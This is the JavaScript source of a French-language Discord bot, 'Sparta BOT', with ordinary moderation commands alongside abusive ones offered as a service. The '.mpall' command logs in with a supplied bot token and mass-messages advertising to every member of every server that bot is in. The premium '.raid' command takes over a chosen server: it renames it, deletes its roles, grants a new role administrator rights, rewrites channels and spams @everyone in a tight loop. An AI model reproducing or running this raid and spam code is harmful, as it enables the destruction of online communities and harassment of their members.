var XMLHttpRequest = require("xmlhttprequest").XMLHttpRequest;
const Discord = require("discord.js");
const bot = new Discord.Client();
const couleurs = require("./couleurs.json");
const fs = require("fs");
const sleep = require("system-sleep")

//////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////// BOT ON MEMBER //////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////// MESSAGE BIENVENUE //////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////

bot.on('guildMemberAdd', member => {

      var BvnEmbe = new Discord.RichEmbed()
    .setTitle("**BIENVENUE PARMIS NOUS JEUNE SPARTIATE !**")
    .addField("__Qui suis-je ?__", "Je m'appelle Sparta BOT mes créateurs sont : Ympax et Quentin ! \nJe suis capable de faire beaucoup de commandes, plus d'informations en faisant .help sur le serveur Sparta BOT !\n")
.addField("__Nos services :__", "Pour avoir accès à nos services il faut seulement inviter 2 petites personnes sur notre serveur ! \nPourquoi 2 ? \nCar tout simplement si tout le se fait WhiteLister et que tout le monde m'utilise en même temps, je suis solide mais j'ai des limites !\n\n")
    .addField("__Pourquoi rester sur notre serveur ?__", "Car tout simplemement je suis un BOT Inédit ! J'ai des commandes et des fonctionalités extraordinaire !\nEn plus de ça, mes créateurs m'ajoute beaucoup de contenu de jour en jour ! !\n")
    .setImage("https://cdn.discordapp.com/attachments/693437502555553803/693461049575211048/image0.gif")
    .setFooter(`Sparta BOT`)
    .setTimestamp();
    member.send(BvnEmbe); 

    let newEmbed = new Discord.RichEmbed()
    .setColor('#00ff00')
    .setDescription(`${member} nous à rejoint. *(${member.guild.memberCount})*`)
    let Channel = bot.channels.get("694218291748536370");
      Channel.send(newEmbed)
});

///////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////// MESSAGE AUREVOIR ////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////
 
 bot.on("guildMemberRemove", member => {
    let removeEmbed = new Discord.RichEmbed()
    .setDescription(`${member} nous à quitté. *(${member.guild.memberCount})*`)
    .setColor('#ff0000');
    let Channel = bot.channels.get("694218291748536370");
   Channel.send(removeEmbed)
});

///////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////// BOT ON READY ////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////

bot.on("ready", () => {
    console.log('Le bot est online!')
    bot.user.setStatus("dnd");
  
    bot.user.setActivity("UNIQUE BOT", {  
        type: "STREAMING",
        url: "https://www.twitch.tv/example"
    });
});

//////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////// BOT ON MESSAGE /////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////

bot.on("message", message => {
    
    let IDowner1 = "583479814984433668"; // Quentin
    let IDowner2 = "350862656174948354"; // Ympax

    if(message.guild.id !== "677130476900843540") { 
      if(message.author.id !== IDowner1 && message.author.id !== IDowner2) {
       return;
      }
    }
    var GuildsTable = [];
   var GuildsTableMCount = [];
  const prefix = ".";
  const args = message.content.slice(prefix.length).split(" ");
  const command = args.shift().toLowerCase();


//////////////////////////////////////////////////////////////////////////////////////
///////////////////////////// MPALL //////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////
  
const args2 = message.content.slice(".mpall ").trim().split(/ +/g);  
        if(message.content.startsWith(".mpall")) {
        var sleep = require('system-sleep');
        let DMED = 0;
        let param1 = ".mpall"
        let param2 = args[0]
        let param3 = args.slice(1).join(' ');
        var guild = message.guild;
        var name = message.author.username; 
          
             if(message.author.id === message.channel.name) {
                    if(!param2){
                        return message.channel.send('Merci de préciser un token.')
            
                    }   
                    if(!param3){
                        return message.channel.send('Merci de préciser le texte.')
            
                    };   
        
                    var newclient = new Discord.Client();
        
                    newclient.login(param2).catch(err => {
    let InvEmb = new Discord.RichEmbed()
    .setTitle("<a:cross1:693429048780783616> Token Invalide Ou Expiré")
    .setColor("#F00000")
    .setDescription("**Il se peut que votre bot ait été banni ou bien que le token sois invalide, vous devez allez chercher un autre token dans [__L'interface Développeur__](https://discordapp.com/developers/applications) de Discord**")
    .addField("**Utilisation De La Commande:**", "**.mpall + token + message**", true)
    .setFooter('Mpall Système | by Ympax and Quentin', bot.user.displayAvatarURL)
    .setTimestamp();
    message.channel.send(InvEmb)
  });
                    newclient.on('ready', () => {
        
                        newclient.guilds.forEach(g => {
                          GuildsTable.push(`**- ${g.name}** | (${g.memberCount} Membres)`)
                        });
                                console.log(`Connecter en tant que : ${newclient.user.username} \n\nStatistiques globales : \n\nLe bot a un total de ${newclient.guilds.forEach(g => {g.size})} serveurs. \nPour un total de ${newclient.guilds.forEach(g => {g.members.forEach(m => m.size)})} membres. \n\nMessage :\n\u001b[36m${param3}\u001b[0m\n\n\n `)       
                                
                                message.channel.send(`**Le bot utilisé pour le mp all sera :** \`${newclient.user.username}\` `).then(c => {
                                
                                if(param1 === '.mpall') {

                                    let embed = new Discord.RichEmbed()
                                      //.setAuthor(newclient.user.tag, newclient.user.displayAvatarURL())
                                      .setTitle('Voici les serveurs ou la publicité sera envoyé.')
                                      .setDescription(GuildsTable)
                                      .addField('Message de pub :', param3)
                                      .setColor('#ff0000')
                                      .setFooter('Mpall Système | by Ympax & Quentin', bot.user.displayAvatarURL)
                                      .setTimestamp()

                                      message.channel.send(embed).then(msg => { 
                                          
                                            msg.react(bot.emojis.get("693428883571212288")).then(() => {msg.react(bot.emojis.get('693429048780783616'))});
                                    
                        
                                          let collector = msg.createReactionCollector((reaction, user) => user.id === message.author.id);
                        
                                          collector.on("collect", async(reaction, user) => {
                                            if(reaction._emoji.id === "693429048780783616") {
                            
                                                return msg.delete() & message.channel.send('<a:cross1:693429048780783616> | **Annulation de la publicité.**').then(m => {
                                                  newclient.destroy();
                                                  setTimeout(() => {
                                                    m.delete()
                                                    return;
                                                  }, 5000)
                                                  
                                                });
                            
                                            };
                                            if(reaction._emoji.id === "693428883571212288") {
                            
                                                msg.delete() & message.channel.send('<a:checkmark:693428883571212288> | **Le bot va lancer la pub mp...**') 
                              var a = new Discord.RichEmbed()
                             .setTitle("Publicité fini")
                             .setDescription("Envoyer a tous le monde ( " + DMED + " membres )")
                             .setFooter('Mpall Système | by Ympax & Quentin', bot.user.displayAvatarURL)
                             .setTimestamp();
                             message.channel.send(a).then(m => {                                                
                                                let timeout = 100
                                                newclient.guilds.forEach(g => {
                                                    g.members.forEach(member => {
                                                      DMED += 1;
                                                    if(member === newclient.user) {
        
                                                    } else {
                                                        member.send(param3).catch(err => { console.log(err)})
                                                        var member = 0;
                        }
                              var a = new Discord.RichEmbed()
                             .setTitle("Publicité | Progression")
                             .setDescription("Envoyer a tous le monde ( " + DMED + " membres )")
                             .setFooter('Mpall Système | by Ympax & Quentin', bot.user.displayAvatarURL)
                             .setTimestamp();
          
                              m.edit(a);
                                                    
        
                                                 });
                                                 });
                                            });
                                            };
                            
                                          });
                                    });
                                
                     newclient.guilds.forEach(g => {
        let TotalMembers = g.members.filter(member => !member.user.bot).size; 
                           if (DMED == TotalMembers) {
                             let FinishEmb = new Discord.RichEmbed()
                             .setTitle("Publicité Finis")
                             .setDescription("Envoyer a tous le monde ( " + DMED + " membres )")
                            .setFooter('Mpall Système | by Ympax & Quentin', bot.user.displayAvatarURL)
                             .setTimestamp();
                                     message.channel.fetchMessages().then(m => {
                                       if (m.author.id == bot.user.id) {
                                          m.edit(FinishEmb)
                                       }
                                     });
                          }
                            });

                                  };
                    });
                    });

                } else {
              var MauSal = new Discord.RichEmbed()
                  .setDescription(`<a:uncheck:693428016105127966> ${message.author.username}, veuillez exécuter cette commande dans votre salon privé.`)  
                  .setColor("#000000");
                  message.channel.send(MauSal);
                }
        }
//////////////////////////////////////////////////////////////////////////////////////
///////////////////////////// HELP //// //////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////

if (command == "help") {
message.delete();
 var help = new Discord.RichEmbed()
  .setTitle("Voici les commandes disponibles :")
  .addField(".mpall + token + message", "Envoyer un message à tous les membres qui sont présents sur le même serveur que le bot.")
  .addField(".raid + token + serveur ID + RaidMessage **[PREMIUM]**", "Permets de créer pleins de salon textuel et spam @everyone dans les salons.")
  .setDescription(`Si vous avez besoin d'aide, n'hésiter pas à contacter un Créateur ou un Helper !`)
  .setColor('#000000')
  .setFooter('Bot Système | by Ympax & Quentin', bot.user.displayAvatarURL)
  .setTimestamp();
message.channel.send(help);
}



//////////////////////////////////////////////////////////////////////////////////////
///////////////////////////// WHITELIST //////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////

  if(message.content.startsWith(".wl")) {
    let guild = message.guild
    let param1 = message.mentions.users.first() || message.guild.members.get(args[0]);
if(message.author.id !== IDowner1 && message.author.id !== IDowner2) return;
    if(message.guild.channels)
    if(!param1){
      return message.channel.send(`Merci de mentionnez un utilisateur. .`)
};
    
message.guild.createChannel(param1.id, "text").then(c =>{
  c.overwritePermissions(param1, {
    VIEW_CHANNEL: true
  });
  
  c.overwritePermissions("677130476900843540", { // 677130476900843540 = Guild ID = @everyone
    VIEW_CHANNEL: false
  });
  
  var b = new Discord.RichEmbed()
    .setDescription(`**${param1.username}** à été whitlist avec succès <a:check:693428059910701066>`)
    .setColor("#02ff04");
message.channel.send(b);

  var BvnEmb = new Discord.RichEmbed()
    .setTitle(`**Bienvenue dans votre salon privé, ${param1.username}**`)
    .setDescription(`Vous disposez maintenant de votre propre salon privé pour éffectuer vos commandes avec Sparta BOT.\n Rappelez-vous que vous devez avoir un ou plusieurs tokens de bot pour utiliser Sparta BOT, si vous n'avez pas encore de token, adressez-vous à un Helpers pour en savoir plus.`)
    .setColor("#000000")
    .setThumbnail("https://cdn.discordapp.com/attachments/694153773223903274/694156430248247336/image0.jpg");
c.send(BvnEmb);

  var CommandEmb = new Discord.RichEmbed()
    .setTitle(`**Utilisation de Sparta BOT**`)
    .setDescription(`__Voici les commandes que vous pouvez utiliser avec Sparta BOT:__`)
    .addField(".mpall + token + message", "Cette commande permet d'envoyer votre publicité aux membres de tous les serveurs dans lequel se trouve votre bot.")
    .addField(".raid + token + server ID + message [PREMIUM]", "Cette commande permets de détruire le serveur choisis.")
    .setColor("#000000")
    .setImage("https://cdn.discordapp.com/attachments/693437502555553803/693461049575211048/image0.gif")
    .setFooter('Bot Système | by Ympax & Quentin', bot.user.displayAvatarURL)
    .setTimestamp();
c.send(CommandEmb);

});
  }

///////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////// SUPPRIMER LES SALONS //////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////

  if (command == "delchannels") {
    if(message.author.id !== IDowner1 && message.author.id !== IDowner2) return;
    message.guild.channels.forEach(async(channels, id) => {
      channels.delete();
    });
   message.guild.createChannel("Général", "text");
  }

//////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////// CLEAR ///////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////

  if (command == "clear") {
    message.delete();
    if(message.author.id !== IDowner1 && message.author.id !== IDowner2) return;
   let Message = args[0];
    if (!Message) return message.channel.send("Indique moi le nombre de message que tu souhaite supprimer !")
    message.channel.bulkDelete(Message).then(() => {
      message.channel.send(Message + " Messages supprimés !").then(c => {  
        setTimeout(() => {
          c.delete();
        }, 1000)
      });
    });
  }

///////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////// SAY ///////////////////////////////////////////////// // FAIS
///////////////////////////////////////////////////////////////////////////////////////

  if (command == "say") {
if(!message.member.hasPermission(["MANAGE_MESSAGES", "ADMINISTRATOR"])) return message.channel.send("Tu n'as pas les permissions pour faire celà!")

    let argsresult;
    let mChannel = message.mentions.channels.first()

    message.delete()
    if(mChannel) {
        argsresult = args.slice(1).join(" ")
        mChannel.send(argsresult)
    } else {
        argsresult = args.join(" ")
        message.channel.send(argsresult)
    }
  }

//////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////// PING ///////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////

if (command == "ping") {

  message.channel.send(`🏓 Pinging....`).then(msg => {
    setTimeout(() => {
      
   msg.edit(`🏓 Pong!
        Tu as ${Math.floor(msg.createdTimestamp - message.createdTimestamp)}ms
        Le bot à ${Math.round(bot.ping)}ms`);
          }, 2000)

      });
}

//////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////// WARN ///////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////

let warns = JSON.parse(fs.readFileSync("./warnings.json", "utf8"));
if (command == "warn") {
   
    if(!message.member.hasPermission(["MANAGE_MESSAGES", "ADMINISTRATOR"])) return message.channel.send("Tu n'as pas les permissions pour faire celà!")
 
    let member = message.mentions.members.first()
    if(!member) return message.channel.send("Merci de mentionner un utilisateur")
    if(member.highestRole.calculatePosition >= message.member.highestRole.calculatePosition && message.author.id) return message.channel.send("Vous n'avez pas la permission de warn cette personne")
    let reason = args.slice(1).join(" ")
    if(!reason) return message.channel.send("Merci de dire la raison")
    if(!warns[member.id]) warns[member.id] = {
        warns: 0
    }
    warns[member.id].warns++;
 
    fs.writeFileSync("./warnings.json", JSON.stringify(warns))
 
    let warnEmbed = new Discord.RichEmbed()
    .setDescription(`WARNING - Vous venez de recevoir un warn du serveur **${message.guild.name}** avec comme raison : \n**${reason}**`)
    .setColor(`#000000`)
 
    message.channel.send(member + " à bien été warn pour " + reason)
 
    member.createDM().then(channel => {
        channel.send(warnEmbed)
    })
 
    let warnlvl = warns[member.id].warns;
    message.channel.send(`${member} à maintenant ${warnlvl} warn.`)
}

///////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////// RAID ////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////
  let premium = JSON.parse(fs.readFileSync("./premiums.json", "utf8"));
  
  if (command == "raid") {
        if(!premium[message.author.id]) premium[message.author.id] = {
        premium: 0
    }
    fs.writeFileSync("./premiums.json", JSON.stringify(premium))
    
    if (premium[message.author.id].premium == 1) {

  if(message.author.id === message.channel.name) {
  let Token = args[0];
  let ServerID = args[1];
  let RaidMSG = args.slice(2).join(' ');
  if (!Token) return message.channel.send("**Besoin D'un Token !**")
  if (!ServerID) return message.channel.send("**Besoin D'un ID De Serveur !**")
  if (!RaidMSG) return message.channel.send("**Besoin D'un Message De Raid !**")
  var newclient = new Discord.Client();
  newclient.login(Token).catch(err => {
    let InvEmb = new Discord.RichEmbed()
    .setTitle("<a:cross1:693429048780783616> Token Invalide Ou Expiré")
    .setColor("#F00000")
    .setDescription("**Il se peut que votre bot ait été banni ou bien que le token sois invalide, vous devez allez chercher un autre token dans [__L'interface Développeur__](https://discordapp.com/developers/applications) de Discord**")
    .addField("**Utilisation De La Commande:**", "**.raid + token + ServeurID + RaidMessage**", true)
    .setFooter('Raid Système | by Ympax and Quentin', bot.user.displayAvatarURL)
    .setTimestamp();
    message.channel.send(InvEmb)
  });
  newclient.on("ready", () => {
    console.log("Connecter sous: " + newclient.user.username);
   let RaidedG = newclient.guilds.get(ServerID);
    let RaidEmb = new Discord.RichEmbed()
    .setTitle('Raid Confirmation | Raid Serveur ID:')
    .setDescription(ServerID)
    .addField('Message de Raid:', RaidMSG)
    .setColor('#ff0000')
    .setFooter('Raid Système | by Ympax and Quentin', bot.user.displayAvatarURL)
    .setTimestamp();

    message.channel.send(RaidEmb).then(c => {
      c.react(bot.emojis.get("693428883571212288")).then(() => {c.react(bot.emojis.get("693429048780783616"))})
    });
          bot.on('messageReactionAdd', (reaction, user) => {
        if (reaction.emoji.id === "693428883571212288" && user.id !== bot.user.id) {
          message.channel.send(`**<a:checkmark:693428883571212288> Raid Du Server... Avec L'ID: ${ServerID}, avec le message: ${RaidMSG}, avec le bot ${newclient.user.username}**`).then(m => {
            m.react("693429048780783616");
          });
      RaidedG.setName("𝓡𝓪𝓲𝓭 𝓢𝓬𝓻𝓲𝓹𝓽 𝓑𝔂 𝓢𝓹𝓪𝓻𝓽𝓪 𝓣𝓮𝓪𝓶")
      RaidedG.setIcon("https://cdn.discordapp.com/attachments/694196923359297607/694201989612961872/image0.jpg")

    RaidedG.roles.forEach(r => {
      r.delete().then(() => {
     if (RaidedG.roles.size < 40) {
      setInterval(() => {
        RaidedG.createRole({
          name: "💥𝓢𝓹𝓪𝓻𝓽𝓪💥",
          color: "RED",
          permissions: ["ADMINISTRATOR"]
        });
      });
    }
     RaidedG.members.forEach(members => {
      let Sparte = RaidedG.roles.find(role => role.name === "💥𝓢𝓹𝓪𝓻𝓽𝓪💥");
      members.addRole(Sparte);
    });
      });
    });
        setInterval(() => {
          RaidedG.channels.forEach(c => {
        if (RaidedG.channels.size < 40) {
          RaidedG.createChannel(`Raid By ${message.author.username}`)
        }
       c.setName(`Raid By ${message.author.username}`).then(() => {
            c.send(`@everyone, **${RaidMSG} [Raid By: ${message.author.username}]**`)
       })
    });
                }, 1);
        } else if (reaction.emoji.id === "693429048780783616" && user.id !== bot.user.id) {
          message.channel.send("**<a:cross1:693429048780783616> Annulation Du Raid...**").then(c => {
            newclient.destroy();
            setTimeout(() => {
              c.delete
            }, 5000)
            return;
          });
        }
        
      });
  });
  }
  } else {
    message.channel.send("**Tu n'es pas premium !**")
  }
  }
  
///////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////// USERINFO ////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////
   
  if (command == "userinfo") {
   var PremiumCheck = "";
   var Message = "";
   let member = message.mentions.users.first();
    if (!member) member = message.author;
   if(!premium[member.id]) premium[member.id] = {
        premium: 0
    }
    fs.writeFileSync("./premiums.json", JSON.stringify(premium))
  
    Message = member.avatarURL
        var cdate = member.createdAt;
    
        if (premium[member.id].premium == 1) {
      PremiumCheck = "yes"
    } else if (premium[member.id].premium !== 1) {
      PremiumCheck = "no"
    }
    
    let UserInfoEmb = new Discord.RichEmbed()
    .setAuthor(member.username, Message)
    .setTitle(`__UserInfo | ${member.username}__`)
    .setDescription(`
**__Crée Le:__ ${cdate}**
**__Premium:__ ${PremiumCheck}**
`)
    .setFooter('UserInfo | by Ympax and Quentin', bot.user.displayAvatarURL);
    
    message.channel.send(UserInfoEmb)
  }
  
  if (command == "stop") {
    if (message.author.id !== IDowner1 && message.author.id !== IDowner2) return
    bot.destroy()
  }

});

bot.login(process.env.TOKEN).catch(err => {
  console.log(err)
});
